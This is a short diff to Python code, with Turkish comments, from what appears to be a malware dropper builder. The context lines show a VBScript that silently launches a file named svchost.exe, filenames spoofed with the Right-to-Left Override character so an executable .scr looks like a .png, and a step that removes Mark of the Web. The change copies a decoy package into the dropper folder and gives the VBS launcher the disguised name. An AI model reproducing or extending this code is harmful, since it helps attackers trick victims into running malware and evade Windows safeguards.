@@ -643,10 +643,23 @@ WshShell.Run Chr(34) & myDir & "\\svchost.exe" & Chr(34), 0, False
         
         # Örn: resim + RLO + gnp.scr -> resimrcs.png
         rlo_name = f"{base_name}{RLO}{reversed_ext}.{real_ext}"
-        rlo_path = os.path.join('stealth_dropper', rlo_name)
+        rlo_dir = os.path.join(os.getcwd(), 'stealth_dropper')
+        os.makedirs(rlo_dir, exist_ok=True)
+        rlo_path = os.path.join(rlo_dir, rlo_name)
 
         import shutil
-        shutil.copy2(final_exe, rlo_path)
+        # Eğer yem dosya kullandıysak tüm paketi kopyalamalıyız.
+        # final_exe artık disguise_pkg klasörünün içinde open.vbs.
+        # Tüm dosyaların stealth_dropper içine kopyalanması gerekiyor.
+        if decoy_path and os.path.exists(decoy_path):
+            # pkg_dir içindeki dosyaları kopyala
+            for f in os.listdir(pkg_dir):
+                if f == "open.vbs":
+                    shutil.copy2(os.path.join(pkg_dir, f), rlo_path)
+                else:
+                    shutil.copy2(os.path.join(pkg_dir, f), os.path.join(rlo_dir, f))
+        else:
+            shutil.copy2(final_exe, rlo_path)
 
         # MOTW temizle
         try:
